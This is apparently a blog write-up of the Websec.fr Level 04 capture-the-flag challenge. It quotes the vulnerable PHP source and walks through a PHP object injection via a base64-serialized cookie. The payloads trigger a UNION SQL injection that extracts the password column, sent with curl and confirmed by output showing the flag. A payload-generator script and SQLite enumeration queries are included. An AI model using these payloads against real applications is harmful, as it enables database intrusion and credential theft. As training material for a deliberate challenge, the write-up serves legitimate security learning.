---
private: 'false'
layout: post
featured: false
published: true
comments: true
modified: 2018-03-22
date: 2018-03-22
title: 'Websec.fr babysteps: Level 04 - 1pts'
tags: [hackthebox]
mathjax: false
imagefeature: 
description: 'Websec.fr Easy: Level 01'
category: Websec.fr
chart: null
---


## Problem
---

Problem URL : https://websec.fr/level04/index.php<br />
Problem Description : Since we're lazy, we take advantage of php's garbage collector to properly display query results.
                      We also do like to write neat OOP. You can get the sources here and here.

```php
//source1.php
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>

<!DOCTYPE html>
<html>
<head>
        <title>#WebSec Level Four</title>
        <link rel="stylesheet" href="../static/bootstrap.min.css" />
</head>
        <body>
                <div id="main">
                        <div class="container">
                                <div class="row">
                                        <h1>LevelFour <small> - Cereal is nation</small></h1>
                                </div>
                                <div class="row">
                                        <p class="lead">
                        Since we're lazy, we take advantage of php's garbage collector to properly display query results.<br>
                         We also do like to write neat OOP.
                        You can get the sources <a href="source1.php">here</a> and <a href="source2.php">here</a>.
                                        </p>
                                </div>
                        </div>
                        <div class="container">
                <div class="row">
                    <form class="form-inline" method='post'>
                        <input name='id' class='form-control' type='text' placeholder='User id'>
                        <input class="form-control btn btn-default" name="submit" value='Go' type='submit'>
                                        </form>
                                </div>
                        </div>
                </div>
        </body>
</html>
```

```php
//source2.php
<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
?>
```


## Solve
---

The problem here our ip address saved in cookie within serialized base64 string,
the cookie named `leet_hax0r` , if the cookie is exsist the script trying to unsealized it.

so this vulnerable to PHP Object Injection because the class SQL put his action to query in `__destruct` magic php method
that will be called when the object destroyed, so if we create SQL object with unserialize and supliying custom query to `$query` variable
we could have sql injection ヽ(・∀・)ﾉ

```
echo -n 'O:3:"SQL":1:{s:5:"query";s:37:"SELECT username FROM users WHERE id=1";}' |base64
TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzc6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEiO30=
```

with this serialized object we could check if the custom query we suplied running correctly with this command
```
curl -v https://websec.fr/level04/index.php -H "Cookie: leet_hax0r=TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzc6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEiO30="

if you see : <strong>Username:<strong> flag</p>
so that validate the exploit is working
 ```
 
 now what query we need to build to get the flag? so we need look closely again
 to the `__destruct()` function.
 
 ```php 
     public function __destruct() {
         if (!isset ($this->conn)) {
             $this->connect ();
         }
         
         $ret = $this->execute ();
         if (false !== $ret) {    
             while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                 echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
             }
         }
     }
 ```
 
 this function will only output $row['username'] and i don't think the flag in username 
 column so we need to use UNION Query to manipulate this, the column still username but we
 want to extract a password so we construct serialized object with that purposes.
 
 ```
 echo -n 'O:3:"SQL":1:{s:5:"query";s:81:"SELECT username FROM users WHERE id=1 UNION SELECT password from users WHERE id=1";}' |base64
 TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODE6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEgVU5JT04gU0VMRUNUIHBhc3N3b3JkIGZyb20gdXNlcnMgV0hFUkUgaWQ9MSI7fQ==
 
 curl -v https://websec.fr/level04/index.php -H "Cookie: leet_hax0r=TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODE6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkP
 TEgVU5JT04gU0VMRUNUIHBhc3N3b3JkIGZyb20gdXNlcnMgV0hFUkUgaWQ9MSI7fQ=="
 
 <!DOCTYPE html>
 <html>
 <head>
         <title>#WebSec Level Four</title>
         <link rel="stylesheet" href="../static/bootstrap.min.css" />
 </head>
         <body>
                 <div id="main">
                         <div class="container">
                                 <div class="row">
                                         <h1>LevelFour <small> - Cereal is nation</small></h1>
                                 </div>
                                 <div class="row">
                                         <p class="lead">
                                                 Since we're lazy, we take advantage of php's garbage collector to properly display query results.<br>
                                                  We also do like to write neat OOP.
                                                 You can get the sources <a href="source1.php">here</a> and <a href="source2.php">here</a>.
                                         </p>
                                 </div>
                         </div>
                         <div class="container">
                                 <div class="row">
                                         <form class="form-inline" method='post'>
                                                 <input name='id' class='form-control' type='text' placeholder='User id'>
                                                 <input class="form-control btn btn-default" name="submit" value='Go' type='submit'>
                                         </form>
                                 </div>
                         </div>
                 </div>
         </body>
 </html>
 * Connection #0 to host websec.fr left intact
 <p class="well"><strong>Username:<strong> WEBSEC{9abd8e824[REDACTED]bb662769c08500}</p><p class="well"><strong>Username:<strong> flag</p>#
```

We Got The flag  <(￣︶￣)>

**Bonus:** we could use `as` too for manipulate the column name to username `select password as username from users where id=1`

if you lazy to construct the serialized payload manually you can use this and use the base64 as cookie
```php
<?php

class SQL {
    public $query = 'SELECT password AS username FROM users WHERE id=1';
    public $conn;
}

echo base64_encode(serialize(new SQL()));
```

```
SELECT username FROM users WHERE id=-1 union select group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'-- - (To find what table is available)
SELECT username FROM users WHERE id=-1 union select sql from sqlite_master where type!='meta' and sql not null and name not like 'sqlite_%' and name='users'-- - (To find what is the table column)
```